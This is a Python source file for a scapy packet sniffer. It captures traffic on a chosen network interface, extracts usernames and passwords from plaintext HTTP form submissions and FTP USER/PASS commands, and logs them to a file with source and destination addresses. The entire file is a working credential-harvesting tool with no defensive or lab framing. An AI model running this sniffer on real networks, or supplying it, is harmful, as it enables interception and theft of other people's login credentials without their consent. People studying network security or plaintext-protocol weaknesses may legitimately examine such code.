import scapy.all as scapy
import argparse
from scapy.layers import http
from scapy.layers.inet import TCP
import time
import re
from datetime import datetime

LOG_FILE = "credentials_log.txt"

def get_interface():
    parser = argparse.ArgumentParser(description="Packet Sniffer")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff on")
    parser.add_argument("-t", "--time", type=int, default=0, help="Duration to sniff (seconds)")
    parser.add_argument("-c", "--count", type=int, default=0, help="Number of packets to sniff")
    args = parser.parse_args()
    return args.interface, args.time, args.count

def log_credential(creds):
    try:
        with open(LOG_FILE, "a") as f:
            timestamp = creds['timestamp']
            protocol = creds['protocol']
            source = creds['src']
            destination = creds['dst']
            username_fields = creds.get('username_fields', [])
            password_fields = creds.get('password_fields', [])
            
            log_entry = f"[{timestamp}] {protocol} {source}->{destination} "
            for field_type, fields in [("Usernames", username_fields), ("Passwords", password_fields)]:
                if fields:
                    log_entry += f"{field_type}: " + ", ".join(f"{field_name}:{field_value}" for field_name, field_value in fields) + " "
            
            f.write(log_entry.strip() + "\n")
    except KeyError as e:
        print(f"[ERROR] Data Missing from file.{e}")

def create_creds(protocol, packet, timestamp, username_fields=[], password_fields=[]):
    return {
        'protocol': protocol,
        'src': packet[scapy.IP].src,
        'dst': packet[scapy.IP].dst,
        'timestamp': timestamp,
        'username_fields': username_fields,
        'password_fields': password_fields
    }
        
def process_packet(packet):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            user_fields = re.findall(r"(username|user|email)=([^&\s]+)", load, re.I)
            pass_fields = re.findall(r"(password|pass|pwd)=([^&\s]+)", load, re.I)
            if user_fields or pass_fields:
                creds = create_creds('HTTP', packet, timestamp, user_fields, pass_fields)
                log_credential(creds)
                print(f"[HTTP] Credentials Detected: {creds}")
    # FTP (port 21, TCP)
    elif packet.haslayer(TCP) and (packet[TCP].dport == 21 or packet[TCP].sport == 21):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            if "USER" in load or "PASS" in load:
                parts = load.strip().split()
                if len(parts) >= 2:
                    user_fields, pass_fields = [], []
                    if "USER" in parts[0]:
                        user_fields = [tuple(parts[:2])]
                    elif "PASS" in parts[0]:
                        pass_fields = [tuple(parts[:2])]
                    creds = create_creds('FTP', packet, timestamp, user_fields, pass_fields)
                    log_credential(creds)
                    print(f"[FTP] Credentials Detected: {creds}")

def main():
    iface, duration, count = get_interface()
    print(f"Sniffing on {iface}... (duration: {duration}s, count: {count})")
    try:
        scapy.sniff(iface=iface, store=False, prn=process_packet, timeout=duration or None, count=count or None)
    except PermissionError:
        print("[!] Permission denied. Run as root/administrator.")
    except Exception as e:
        print(f"[!] Error: {e}")

    # Print summary
    try:
        with open(LOG_FILE, "r") as f:
            lines = f.readlines()
            print(f"\n[SUMMARY] Credentials detected ({len(lines)}):")
            for line in lines:
                print(line.strip())
    except FileNotFoundError:
        print("[SUMMARY] No credentials detected.")

if __name__ == "__main__":
    main()
